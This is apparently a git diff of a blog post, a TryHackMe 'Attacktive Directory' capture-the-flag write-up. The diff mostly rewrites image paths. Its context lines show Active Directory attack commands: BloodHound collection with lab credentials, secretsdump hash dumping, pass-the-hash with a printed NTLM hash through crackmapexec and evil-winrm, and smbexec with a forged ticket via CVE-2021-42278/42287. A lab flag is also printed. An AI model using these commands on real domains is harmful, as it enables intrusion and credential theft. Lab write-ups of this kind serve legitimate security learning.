@@ -4,9 +4,9 @@ author: yufong
 categories: [TryHackMe, Active Directory]
 date: 2022-01-09
 tags: [ad/kerbrute/user-enum, ad/as-rep-roasting, ad/kerbrute/password-spray, ad/kerberoasting, tcp/139-445-smb/fileshare , ad/bloodhound, ad/evil-winrm, ad/secretsdump]
-img_path: /Writeups/TryHackMe/Active Directory/Attacktive Directory/images/
+img_path: /_posts/Writeups/TryHackMe/Active Directory/Attacktive Directory/images/
 image:
-  src: Pasted%20image%2020220219220550.png
+  path: /_posts/Writeups/TryHackMe/Active Directory/Attacktive Directory/images/Pasted%20image%2020220219220550.png
   width: 1000   # in pixels
   height: 400   # in pixels
 ---
@@ -159,7 +159,7 @@ crackmapexec smb $ip
 ![Attacktivedirect crackmapexec.png](Attacktivedirect%20crackmapexec.png)
 
 ### Enum4Linux
-![](Pasted%20image%2020220219225515.png)
+![]({{ page.img_path }}Pasted%20image%2020220219225515.png)
 - Unable to enumerate any users.
 - Domain Name AKA DNS Domain: `spookysec.local`
 - FQDN: `AttacktiveDirectory.spookysec.local`
@@ -210,7 +210,7 @@ crackmapexec smb $ip
 	``` 
 	TryHackMe{K3rb3r0s_Pr3_4uth}
 	```
-	![](Pasted%20image%2020220219231904.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219231904.png)
 
 
 # Privilege Escalation 
@@ -255,20 +255,20 @@ crackmapexec smb $ip
 	# More complete syntax
 	bloodhound-python -c All -u 'svc-admin' -p 'management2005' -gc 'ATTACKTIVEDIREC.spookysec.local' -dc 'AttacktiveDirectory.spookysec.local' -d 'spookysec.local' -ns $ip --zip
 	```
-	![](Pasted%20image%2020220219233046.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219233046.png)
 	- Both command works, use 1 only
 2. Bloodhound Analysis
 	- Setup
-	![](Pasted%20image%2020220219225605.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219225605.png)
 	- Results:
-		![](Pasted%20image%2020220219203013.png)
-		![](Pasted%20image%2020220219225659.png)
+		![]({{ page.img_path }}Pasted%20image%2020220219203013.png)
+		![]({{ page.img_path }}Pasted%20image%2020220219225659.png)
 3. User backup@spookysec.local has `GenericAll` over the domain controller, allowing us to dump hashes on domain w/ secretsdump
 	```
 	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/bloodhound]
 	└─# impacket-secretsdump 'spookysec.local/backup@10.10.58.30' -just-dc -outputfile secrets_dump_hash.txt
 	```
-	![](Pasted%20image%2020220219233158.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219233158.png)
 4. Extract only NTLM hash
 	```
 	cat secrets_dump_hash.txt.ntds | cut -d ':' -f4
@@ -277,15 +277,15 @@ crackmapexec smb $ip
 	```
 	crackmapexec smb/winrm $ip -u 'a-spooks' -H '0e0363213e37b94221497260b0bcb4fc'
 	```
-	![](Pasted%20image%2020220219213031.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219213031.png)
 6. Access via evil-winrm to obtain flags
 	```
 	evil-winrm -u 'a-spooks' -H '0e0363213e37b94221497260b0bcb4fc' -i $ip
 	```
-	![](Pasted%20image%2020220219212526.png)
-	![](Pasted%20image%2020220219213758.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219212526.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219213758.png)
 7. Root Flag
-	![](Pasted%20image%2020220220000101.png)
+	![]({{ page.img_path }}Pasted%20image%2020220220000101.png)
 	
 ## Domain Admin - CVE-2021-42278 & CVE-2021-42287
 1. This exploit allows us to privilege escalate from any domain user to a domain administrator
@@ -349,13 +349,13 @@ crackmapexec smb $ip
 	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
 	└─# KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-smbexec -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local
 	```
-	![](Pasted%20image%2020220219205600.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219205600.png)
 7. Or dump hashes w/ secretsdump
 	``` 
 	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
 	└─# KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-secretsdump -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local
 	```
-	![](Pasted%20image%2020220219215222.png)
+	![]({{ page.img_path }}Pasted%20image%2020220219215222.png)
 8. Explanation of exploit
 	- https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds
 	- https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
